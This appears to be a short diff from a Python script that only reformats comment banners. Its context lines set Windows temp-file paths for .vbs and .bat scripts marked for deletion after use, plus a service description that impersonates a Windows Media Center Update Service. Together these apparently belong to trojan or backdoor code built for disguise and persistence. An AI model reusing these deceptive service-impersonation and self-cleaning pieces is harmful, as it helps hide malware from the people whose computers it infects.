@@ -216,9 +216,9 @@ if platform.machine()[-2:] == '64':
 	is64 = True
 
 if os.name == 'nt':
-	###################################################################################################
-	## Variables for windows:																		 ##
-	# These will be deleted straight after use:														  #
+
+	# Variables for windows:
+	# These will be deleted straight after use:
 
 	tempvbs = os.getenv('TEMP') + '%sh.vbs' % (os.sep)
 	tempbat = os.getenv('TEMP') + '%sc.bat' % (os.sep)
@@ -233,9 +233,6 @@ if os.name == 'nt':
 	servicedisc = '"' + 'Windows Media Center Update Service for installation, modification, and removal of Windows updates and optional components. If this service is disabled, install or uninstall of Windows updates might fail for this computer.' + '"'
 	proxyfile = os.getenv('TEMP') + os.sep + 'xmlrpc.dat'
 	datafile = os.getenv('WINDIR') + os.sep + 'Temp' + os.sep + 'winrand.dat'
-
-	#																								  #
-	###################################################################################################
 
 	pwdvar = 'cd'
 	isWindows = True
